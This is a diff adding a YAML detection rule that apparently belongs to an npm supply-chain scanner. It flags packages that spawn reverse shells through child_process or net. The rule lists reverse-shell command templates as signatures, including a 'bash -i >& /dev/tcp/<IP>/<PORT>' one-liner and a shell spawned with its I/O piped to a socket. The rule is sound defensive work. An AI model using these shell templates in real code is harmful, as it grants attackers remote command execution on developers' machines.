@@ -1,0 +1,28 @@
+id: CW-npm-behavioral-reverse-shell
+name: Package spawns reverse shell via child_process or net module
+
+type: behavioral_rule
+ecosystem: npm
+severity: CRITICAL
+
+rule: |
+  Package source contains reverse shell patterns:
+    - child_process.exec() or child_process.spawn() with /bin/sh or /bin/bash
+      AND net.Socket or net.connect() to an external IP/hostname
+    - OR child_process.exec("bash -i >& /dev/tcp/<IP>/<PORT> 0>&1")
+    - OR child_process.exec("sh -c 'exec 5<>/dev/tcp/...'")
+    - OR net.Socket.connect() with shell stdin/stdout piped to the socket
+    - OR use of WebSocket to relay shell I/O
+    - OR child_process.spawn('/bin/sh', ['-i'], {stdio: [socket, socket, socket]})
+  AND the target host is an external IP address or hostname (not localhost/127.0.0.1)
+
+description: |
+  A reverse shell grants an attacker interactive command execution on the victim machine.
+  In the context of npm packages, this typically executes during install or on first
+  require(), giving the attacker access to the developer's workstation, CI runner, or
+  production server. This pattern provides full system access far beyond what any legitimate
+  npm package requires. Reverse shells in npm packages have been observed in targeted attacks
+  against cryptocurrency companies and in mass-published malware campaigns on npmjs.com.
+
+author: chainwarden
+tags: [reverse-shell, remote-access, child-process, backdoor, rce]
